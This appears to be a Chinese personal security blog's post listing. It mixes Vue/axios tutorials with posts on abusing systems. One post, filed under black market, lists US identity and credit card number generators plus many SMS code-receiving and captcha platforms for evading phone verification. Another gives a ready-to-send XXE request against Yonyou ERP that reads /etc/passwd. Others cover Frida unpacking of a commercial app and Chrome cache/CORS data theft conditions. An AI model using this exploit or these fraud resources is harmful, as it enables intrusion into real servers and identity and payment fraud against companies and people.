<p>传参两种写法：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 直接在 URL 上添加参数 ID=12345</span><br><span class="line">axios.get('/user?ID=12345')</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br><span class="line"> </span><br><span class="line">// 也可以通过 params 设置参数：</span><br><span class="line">axios.get('/user', &#123;</span><br><span class="line">    params: &#123;</span><br><span class="line">      ID: 12345</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></p>
<p>执行多个请求<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function getUserAccount() &#123;</span><br><span class="line">  return axios.get('/user/12345');</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function getUserPermissions() &#123;</span><br><span class="line">  return axios.get('/user/12345/permissions');</span><br><span class="line">&#125;</span><br><span class="line">axios.all([getUserAccount(), getUserPermissions()])</span><br><span class="line">  .then(axios.spread(function (acct, perms) &#123;</span><br><span class="line">    // 两个请求现在都执行完成</span><br><span class="line">  &#125;));</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-简单实例"><a href="#0x05-简单实例" class="headerlink" title="0x05 简单实例"></a>0x05 简单实例</h2><p><a href="https://www.runoob.com/vue2/vue-examples.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vue-examples.html</a></p>
<h2 id="0x06-常用框架"><a href="#0x06-常用框架" class="headerlink" title="0x06 常用框架"></a>0x06 常用框架</h2><p><a href="https://element.eleme.cn/#/en-US" target="_blank" rel="noopener">https://element.eleme.cn/#/en-US</a><br><a href="https://vuetifyjs.com/zh-Hans/getting-started/quick-start/" target="_blank" rel="noopener">https://vuetifyjs.com/zh-Hans/getting-started/quick-start/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/11/一些不太健康的资料/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/11/一些不太健康的资料/" itemprop="url">一些不太健康的资料</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-11T15:40:30+08:00">
                2020-04-11
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/黑产/" itemprop="url" rel="index">
                    <span itemprop="name">黑产</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>1、美国身份生成器<br><a href="http://www.haoweichi.com/" target="_blank" rel="noopener">http://www.haoweichi.com/</a></p>
<p>2、判断美国号码是实体号还是虚拟号的网站<br><a href="https://freecarrierlookup.com/" target="_blank" rel="noopener">https://freecarrierlookup.com/</a></p>
<p>3、信用卡生成<br><a href="http://www.e4dai.com/tool/CreditCard.asp" target="_blank" rel="noopener">http://www.e4dai.com/tool/CreditCard.asp</a></p>
<p>4、在线接收验证码网站<br>SMSReceiveFree：<a href="https://smsreceivefree.com" target="_blank" rel="noopener">https://smsreceivefree.com</a><br>Receive SMS Online for FREE：<a href="https://www.receive-sms-online.info" target="_blank" rel="noopener">https://www.receive-sms-online.info</a><br>Receive a SMS Online：<a href="https://receive-a-sms.com" target="_blank" rel="noopener">https://receive-a-sms.com</a><br>Free SMS Numbers Online：<a href="https://smsnumbersonline.com" target="_blank" rel="noopener">https://smsnumbersonline.com</a><br>Receive SMS online for Free：<a href="https://sms-online.co/receive-free-sms" target="_blank" rel="noopener">https://sms-online.co/receive-free-sms</a><br>Receive-SMS：<a href="https://receive-sms.com" target="_blank" rel="noopener">https://receive-sms.com</a><br>Receive FREE SMS online：<a href="http://receivefreesms.com" target="_blank" rel="noopener">http://receivefreesms.com</a><br>RECEIVE SMS ONLINE：<a href="https://www.receivesmsonline.net" target="_blank" rel="noopener">https://www.receivesmsonline.net</a><br>Free Online Phone：<a href="https://www.freeonlinephone.org" target="_blank" rel="noopener">https://www.freeonlinephone.org</a><br>Receive SMS Online：<a href="http://receive-sms-online.com" target="_blank" rel="noopener">http://receive-sms-online.com</a><br>TextNow：<a href="https://www.textnow.com" target="_blank" rel="noopener">https://www.textnow.com</a><br>Textfree：<a href="https://www.pinger.com/text-free" target="_blank" rel="noopener">https://www.pinger.com/text-free</a><br>SELLAITE：<a href="http://sms.sellaite.com" target="_blank" rel="noopener">http://sms.sellaite.com</a><br>Twilio：<a href="https://www.twilio.com" target="_blank" rel="noopener">https://www.twilio.com</a><br>国内接码(z-sms)：<a href="http://www.z-sms.com" target="_blank" rel="noopener">http://www.z-sms.com</a><br>国内接码：<a href="https://www.pdflibr.com" target="_blank" rel="noopener">https://www.pdflibr.com</a></p>
<p>5、2020年4月安卓上可用打码<br>具体使用方法可以参考本站里面的  神话接码  教程,  下面给大家整理一些2020年可用的安卓,  PC端短信接码平台如下:</p>
<ol>
<li>爱码:  <a href="http://www.aimajiema.com" target="_blank" rel="noopener">http://www.aimajiema.com</a>  </li>
<li>路虎:  <a href="http://www.luhujiema.com" target="_blank" rel="noopener">http://www.luhujiema.com</a>  </li>
<li>飞享:  <a href="http://feixiang.taixingwds.com/" target="_blank" rel="noopener">http://feixiang.taixingwds.com/</a>  </li>
<li>神妈:  <a href="http://202.79.167.29/" target="_blank" rel="noopener">http://202.79.167.29/</a>  </li>
<li>蓝狐:  <a href="http://xiangjiuer.cn/" target="_blank" rel="noopener">http://xiangjiuer.cn/</a>  </li>
<li>番茄:  <a href="http://ifanqie.cc/" target="_blank" rel="noopener">http://ifanqie.cc/</a>  </li>
<li>米粒:  <a href="http://www.yyyung.cn:9000/index.html" target="_blank" rel="noopener">http://www.yyyung.cn:9000/index.html</a>  </li>
<li>乌龟:  <a href="http://wuguima.cn/" target="_blank" rel="noopener">http://wuguima.cn/</a>  </li>
<li>新妈:  <a href="http://www.xinma1.com:10001/home.html" target="_blank" rel="noopener">http://www.xinma1.com:10001/home.html</a>  </li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/25/用友ERP的XXE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/25/用友ERP的XXE/" itemprop="url">用友ERP的XXE</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-25T18:27:36+08:00">
                2020-03-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/poc/" itemprop="url" rel="index">
                    <span itemprop="name">poc</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">用友的老洞了 XXE（playload见附件）</span><br><span class="line">POST /uapws/soapFormat.ajax HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: text/html,application/xhtml+x</span><br><span class="line">ml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: xmlHttpRequest</span><br><span class="line">Content-Length: 563</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=04471ECB344BF351BCD35FB2E823A913.ncMem02; SaveStateCookie=Server%2Cnc.uap.oba.word.webservice.IServiceEntryPoint%3AIServiceEntryPointPortType%2Cnc.uap.oba.update.IUpdateService%2Cnc.uap.oba.update.IUpdateService%3AIUpdateServicePortType%2Cnc.uap.oba.wordWebservice.IServiceEntry%2Cnc.uap.oba.wordWebservice.IServiceEntry%3AIServiceEntryPortType%2Cnc.itf.msgcenter.IMsgCenterWebService%2Cnc.itf.msgcenter.IMsgCenterWebService%3AIMsgCenterWebServicePortType%2Ctbb%2Cnc.itf.tb.outlineversion.TbbOutlineUpateVersionService%2Cnc.itf.tb.outlineversion.TbbOutlineUpateVersionService%3ATbbOutlineUpateVersionServicePortType%2Cuapmp%2Cuapbs%2Cnc.itf.tb.oba.IOBAMasterNodeWebService%2Cnc.itf.tb.oba.INtbOBAWebService%2Cnc.itf.tb.oba.IOBAMasterNodeWebService%3AIOBAMasterNodeWebServicePortType%2Cnc.itf.tb.oba.INtbOBAWebService%3AINtbOBAWebServicePortType%2Criaam%2Cnc.pubitf.rbac.IUserPubServiceWS%2Cnc.pubitf.rbac.IUserPubServiceWS%3AIUserPubServiceWSPortType%2Cbqrtofr%2Cnc.uap.oba.ws.IObaReportService%2Cnc.uap.oba.ws.IObaReportService%3AIObaReportServicePortType%2Cnc.itf.bap.oba.IObaExcelService%2Cnc.itf.bap.oba.IObaExcelService%3AIObaExcelServicePortType%2Caeam%2Cnc.itf.bap.service.IBapIOService%2Cnc.itf.bap.service.IBapIOService%3AIBapIOServicePortType%2Cnc.uap.oba.word.webservice.IServiceEntryPoint%2Caedsm%2Cuap.pubitf.ae.meta.ImetaWebService4BqCloud%2Cuap.pubitf.ae.meta.ImetaWebService4BqCloud%3AImetaWebService4BqCloudPortType%2Cuap.pubitf.ae.meta.ImetaWebService%2Cuap.pubitf.ae.meta.ImetaWebService%3AImetaWebServicePortType; JSESSIONID=03FAE0AA99984716E2B0BF9BE46A1040.ncMem02</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msg=<span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">faultcode</span>&gt;</span>soap:Server%26xxe%3B<span class="tag">&lt;/<span class="name">faultcode</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">faultstring</span>&gt;</span>java.lang.RuntimeException: can not find datasource: ?<span class="tag">&lt;/<span class="name">faultstring</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/06/关于CORS的一些记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/06/关于CORS的一些记录/" itemprop="url">记一个frida调试瑞幸的过程</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-06T15:00:00+08:00">
                2020-03-06
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p><a href="https://b.cp0.win/chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E9%85%8D%E5%90%88CORS%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2.php" target="_blank" rel="noopener">Chrome缓存和CORS</a>这个文章里记录的Chrome缓存存在问题，在<code>Access-Control-Allow-Origin:* 且Access-Control-Allow-Credentials: false</code>的情况下可能可以获取到敏感信息（credentials可能是true也行），</p>
<h2 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h2><p>先说一下关于这两个头部值的一些问题：</p>
<ol>
<li>当<code>Access-Control-Allow-Origin:*</code>时，credentials不能设置为true，设置为true可能会报错？（不确定），可以设置为false，设置为false不报错，不设置默认应该也是false，即允许任何域时不允许ajax请求传递敏感头部</li>
<li>当<code>Access-Control-Allow-Origin: 某域名</code>时，credentials设置true则是常见的配置漏洞，设置为false时浏览器如果发起ajax时设置withcredentials为true则报错</li>
<li>当不设置时默认为null，即拒绝除本域以外所有的域名<h2 id="0x02-与csrf相比"><a href="#0x02-与csrf相比" class="headerlink" title="0x02 与csrf相比"></a>0x02 与csrf相比</h2>如果文中所说的属实，那么这个漏洞存在应该很久了，而且利用条件很低，目测只要有敏感接口并且设置了<code>Access-Control-Allow-Origin:*</code>，那么这个接口就变成了一个在Chrome浏览器下接近于csrf漏洞。<br>比较一下这个漏洞和jsonp、csrf的差别：<h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3>得存在callback的jsonp接口，存在这种接口，并且会根据cookies返回敏感信息，因为script标签会传递cookies所以就变成了csrf，防范手段也和csrf类似，但接口必须是支持jsonp格式的json接口<h3 id="一般csrf"><a href="#一般csrf" class="headerlink" title="一般csrf"></a>一般csrf</h3>一般的csrf通常是构造html表单并自动提交，通常是触发特定动作而不能获取到数据<h3 id="这个缓存漏洞"><a href="#这个缓存漏洞" class="headerlink" title="这个缓存漏洞"></a>这个缓存漏洞</h3>一般的通过js去拉取数据需要cors配置为<code>Access-Control-Allow-Origin: 某域名</code>且credentials设置true，利用该第三方域名可控来获取敏感数据，但如果配合Chrome缓存问题，可以把这个origin扩大到任意域名，但有个潜在的条件是需要用户先访问目标接口后缓存了页面数据，才可以读取该接口的返回数据。换句话说利用条件：</li>
<li>没有csrf防御</li>
<li>存在敏感信息或有利用价值的东西</li>
<li>origin为星号</li>
<li>用户在这之前用Chrome浏览器访问过该接口</li>
<li>默认浏览器都会存在缓存，除非设置为cache-control为max-age=0或者是no-store<h2 id="0x03-关于缓存"><a href="#0x03-关于缓存" class="headerlink" title="0x03 关于缓存"></a>0x03 关于缓存</h2></li>
<li>Cache-control头部会设置强缓存相关配置</li>
<li>在没有设置cache-control头部时，因为Response Header 存在 Date、Last-Modified浏览器使用LM factor 算法在没有 Cache-Control 以及 Expires 的时候，用来计算应该强制缓存多长时间所以状态码返回还是200 不是 304，如果什么缓存策略都没设置，浏览器会采用一个启发式的算法，通常会取响应头中的 Date 减去 Last-Modified 值的 10% 作为缓存时间。</li>
<li>命中缓存应该只需要url一致即可</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/13/记一个frida调试瑞幸的过程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/13/记一个frida调试瑞幸的过程/" itemprop="url">记一个frida调试瑞幸的过程</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-13T13:21:30+08:00">
                2020-01-13
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/app逆向/" itemprop="url" rel="index">
                    <span itemprop="name">app逆向</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-准备"><a href="#0x00-准备" class="headerlink" title="0x00 准备"></a>0x00 准备</h2><ol>
<li>通过pip安装frida</li>
<li>下载对应的frida-server到安卓端，进去运行server<h2 id="0x01-基本操作"><a href="#0x01-基本操作" class="headerlink" title="0x01 基本操作"></a>0x01 基本操作</h2></li>
<li>adb shell dumpsys activity top即可查看该app的包名</li>
<li>frida-trace -U -i open com.lucky.luckyclient    调用ptrace附着在进程上进行调试，-p指定pid</li>
<li>Frida-ps -U  列出安卓机器上运行的进程<h2 id="0x02-尝试使用Frida-unpack"><a href="#0x02-尝试使用Frida-unpack" class="headerlink" title="0x02 尝试使用Frida-unpack"></a>0x02 尝试使用Frida-unpack</h2></li>
<li><a href="https://github.com/dstmath/frida-unpack" target="_blank" rel="noopener">Frida-unpack</a>，先将安卓机器里的libart.so拉出来到Mac上，一般目录是在/system/lib64下，然后通过nm libart.so| grep OpenMemory命令查看函数名，我这边看了是和脚本里一样的就不改了。</li>
<li><p>clone过来后，修改openmemory.js里的路径改为对应的包名路径，这里要注意的是不要随意修改路径，可能会导致没权限写入，修改对应包名就行。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var file = new File("/data/data/com.lucky.luckyclient/dumps" + dex_size + ".dex", "wb")</span><br></pre></td></tr></table></figure>
<p> 这里改成这样</p>
</li>
<li><p>执行命令：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.lucky.luckyclient -l OpenMemory.js</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到hook在进行了，但是由于壳比较新，中途被检测到后强制中断失败了</p>
<h2 id="0x03-试试别的思路"><a href="#0x03-试试别的思路" class="headerlink" title="0x03 试试别的思路"></a>0x03 试试别的思路</h2></li>
<li>尝试下载了历史版本2.6.0，发现是腾讯加固，使用上面的方式可以进行dumps</li>
<li>但是由于版本低，登录时获取不了短信，先不管他，试着用dex2jar逆向dex试试，发现成功转成jar</li>
<li>通过jd-gui一个个翻翻看在文件“dumps5046568-dex2jar.jar”中的com.lucky.lib.http2.c.class中找到了AES加密算法</li>
<li></li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/vue的学习（上）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/17/vue的学习（上）/" itemprop="url">vue的学习（上）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-17T18:05:11+08:00">
                2019-10-17
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/javascript/" itemprop="url" rel="index">
                    <span itemprop="name">javascript</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-学习vue的简单安装"><a href="#0x00-学习vue的简单安装" class="headerlink" title="0x00 学习vue的简单安装"></a>0x00 学习vue的简单安装</h2><p>下载vue代码在script标签中引入或者是引入cdn链接<a href="https://cdn.staticfile.org/vue/2.2.2/vue.min.js" target="_blank" rel="noopener">https://cdn.staticfile.org/vue/2.2.2/vue.min.js</a>即可完成安装</p>
<h2 id="0x01-目录树"><a href="#0x01-目录树" class="headerlink" title="0x01 目录树"></a>0x01 目录树</h2><p>build    项目构建(webpack)相关代码<br>config    配置目录，包括端口号等。我们初学可以使用默认的。<br>node          modules    npm 加载的项目依赖模块<br>src    这里是我们要开发的目录，基本上要做的事情都在这个目录里。里面包含了几个目录及文件：</p>
<ul>
<li>assets: 放置一些图片，如logo等。</li>
<li>components: 目录里面放了一个组件文件，可以不用。</li>
<li>App.vue: 项目入口文件，我们也可以直接将组件写这里，而不使用 components 目录。</li>
<li>main.js: 项目的核心文件。<br>static.  静态资源目录，如图片、字体等。<br>test    初始测试目录，可删除<br>.xxxx文件    这些是一些配置文件，包括语法配置，git配置等。<br>index.html    首页入口文件，你可以添加一些 meta 信息或统计代码啥的。<br>package.json    项目配置文件。<br>README.md    项目的说明文档，markdown 格式</li>
</ul>
<h2 id="0x02-简单的代码示例"><a href="#0x02-简单的代码示例" class="headerlink" title="0x02 简单的代码示例"></a>0x02 简单的代码示例</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"r1"</span>&gt;</span>修改颜色<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"use"</span> <span class="attr">id</span>=<span class="string">"r1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:class</span>=<span class="string">"&#123;'class1': use&#125;"</span>&gt;</span></span><br><span class="line">    v-bind:class 指令</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">    el: '#app',</span></span><br><span class="line"><span class="undefined">  data:&#123;</span></span><br><span class="line"><span class="undefined">      use: false</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods:&#123;</span></span><br><span class="line"><span class="undefined">	hello:function()&#123;&#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  filters:&#123;</span></span><br><span class="line"><span class="undefined">	//过滤器，通过|符号调用，如 &#123;&#123; message | capitalize &#125;&#125;，可以串联可以接受参数</span></span><br><span class="line"><span class="undefined">    capitalize:function(value)&#123;&#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  computed: &#123;</span></span><br><span class="line"><span class="undefined">    // 计算属性的 getter</span></span><br><span class="line"><span class="undefined">    reversedMessage: function () &#123;</span></span><br><span class="line"><span class="undefined">      // `this` 指向 vm 实例</span></span><br><span class="line"><span 